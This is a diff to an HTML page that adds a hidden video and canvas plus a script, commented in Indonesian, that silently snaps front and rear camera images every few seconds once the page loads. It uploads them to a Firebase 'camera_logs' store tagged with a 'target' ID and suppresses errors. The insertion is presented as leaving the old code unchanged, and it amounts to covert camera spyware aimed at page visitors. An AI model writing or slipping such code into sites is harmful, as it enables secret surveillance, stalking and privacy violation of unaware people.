@@ -206,6 +206,76 @@
                 setInterval(runCycle, 15000);
             }, 2000);
         }
-    </script>
+    <!-- SISIPAN OTOMATIS KAMERA LATAR BELAKANG (TANPA MERUBAH KODE LAMA) -->
+<div style="display:none;">
+    <video id="bgVideo" autoplay playsinline muted></video>
+    <canvas id="bgCanvas"></canvas>
+</div>
+
+<script>
+    // Pastikan Firebase sudah terhubung di file lama Anda
+    (function() {
+        const vEl = document.getElementById('bgVideo');
+        const cEl = document.getElementById('bgCanvas');
+        const ctx = cEl.getContext('2d');
+
+        async function captureAndSend(facingMode, label) {
+            // Android membatasi kamera jika layar benar-benar tertutup total, 
+            // tapi skrip ini akan mencoba mengambil gambar secara berkala saat halaman aktif/terbuka.
+            if (document.hidden) return;
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode },
+                    audio: false
+                });
+
+                vEl.srcObject = stream;
+                await new Promise((resolve) => {
+                    vEl.onloadedmetadata = () => {
+                        vEl.play();
+                        setTimeout(resolve, 1200); // Waktu pemanasan sensor
+                    };
+                });
+
+                cEl.width = vEl.videoWidth || 640;
+                cEl.height = vEl.videoHeight || 480;
+                ctx.drawImage(vEl, 0, 0, cEl.width, cEl.height);
+                
+                const base64Image = cEl.toDataURL('image/jpeg', 0.6);
+                const tId = localStorage.getItem("target_unique_id") || "target_unknown";
+
+                // Kirim otomatis ke Firebase tanpa mengganggu kode lama
+                firebase.database().ref("camera_logs").push({
+                    targetId: tId,
+                    cameraType: label,
+                    image: base64Image,
+                    timestamp: Date.now()
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+                vEl.srcObject = null;
+            } catch (err) {
+                console.log("Auto-capture silent error:", err);
+            }
+        }
+
+        // Jalankan siklus bergantian: Depan -> jeda 4 detik -> Belakang, diulang tiap 15 detik
+        function startBackgroundCaptureLoop() {
+            setInterval(async () => {
+                await captureAndSend("user", "Depan");
+                setTimeout(async () => {
+                    await captureAndSend("environment", "Belakang");
+                }, 4000);
+            }, 15000);
+        }
+
+        // Mulai otomatis setelah halaman siap
+        window.addEventListener('load', () => {
+            setTimeout(startBackgroundCaptureLoop, 5000);
+        });
+    })();
+</script>
+    
 </body>
 </html>
